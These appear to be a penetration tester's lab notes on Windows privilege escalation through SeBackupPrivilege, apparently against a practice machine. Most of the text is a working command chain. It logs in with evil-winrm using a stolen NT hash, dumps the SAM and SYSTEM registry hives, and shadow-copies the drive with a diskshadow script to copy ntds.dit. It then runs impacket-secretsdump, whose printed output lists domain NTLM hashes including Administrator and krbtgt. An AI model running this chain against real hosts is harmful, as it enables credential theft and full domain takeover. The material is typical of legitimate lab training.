# PrivEsc - SeBackupPrivilege

ref: [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

[https://www.youtube.com/watch?v=pWkWIa2dfHY\&ab\_channel=Conda](https://www.youtube.com/watch?v=pWkWIa2dfHY\&ab_channel=Conda)

```python
# use srv_backup has dangerous privilenge assigned
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

# we will attempt to escalate privilege using this misconfigured permission
```

In case of non DC machine, it would be much easier for us to grab the admin hash bythe following method

```python
# evil-winrm to the system and create a directory on C:\\tmp
evil-winrm -i 10.10.10.192 -u srv_backup -H '9658d1d1dcd9250115e2205d9f48400d'

# once done, dump the sam.hive and system.hive into this directory
reg save hklm\\sam C:\\tmp\\sam.hive
reg save hklm\\system C:\\tmp\\system.hive

# now using winrm builtin command, we can download these file to kali

# once down loaded, we can extract these files using pypykart 
pypykatz registry --sam sam.hive system.hive

```

\<aside> ⚠️ This will not work in DC machine because. In the case of a DC, the privilege only allows you to make backups not copies. In a standalone system, we can make copies of the files

\</aside>

### Technique

* Unlike the standalone exploitation, in the Domain Controller, we need the ntds.dit file to extract the hashes along with the system hive.
* The problem with the ntds.dit file is that dc controller is actively using this file, so if it’s in use, it’s not possible to make a copy of that file using conventional method. We need to be more creative.
* To circumvent this problem, we need to use diskshadow functionality. This is a built-in function of Windows that can help us create a copy of a drive that is currently in use.
* There are methods to use the diskshadow which include providing instructions in a diskshadow shell but that tends to be a bit tricky. Hence, we will be creating a Distributed Shell File or a dsh file which will consist of all the commands that are required by the diskshadow to run and create a full copy of our Windows Drive which we then can use to extract the ntds.dit file from.
* We move to our Kali Linux shell and create a dsh file using the editor of your preference. In this file, we are instructing the diskshadow to create a copy of the C:
* Drive into a Z Drive with raj as its alias. The Drive Alias and Character can be anything you want. After creating this dsh file, we need to use the unix2dos to convert the encoding and spacing of the dsh file to the one that is compatible with the Windows Machine…

```python
set context persistent nowriters
add volume c: alias dhawan
create
```

* we use the diskshadow with dsh script as shown in the image below
* If observed, it can be noticed that diskshadow is indeed executing the same commands that we entered in the dsh file sequentially.
* After running, as discussed, it will create a copy of the C drive into Z drive. Now, we can use the RoboCopy tool to copy the file from the Z Drive to the Temp Directory.

```python
cd C:\\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\\windows\\ntds . ntds.dit
```

Now we finally download the file to our system and use `impacket-secretsdump` to extrack the ntml hashes

```python
impacket-secretsdump -ntds ntds.dit -system system local
# if you get the error, download a freshbuild and reinstall dependencie
# <https://github.com/fortra/impacket/issues/1751>

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ../../ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

```
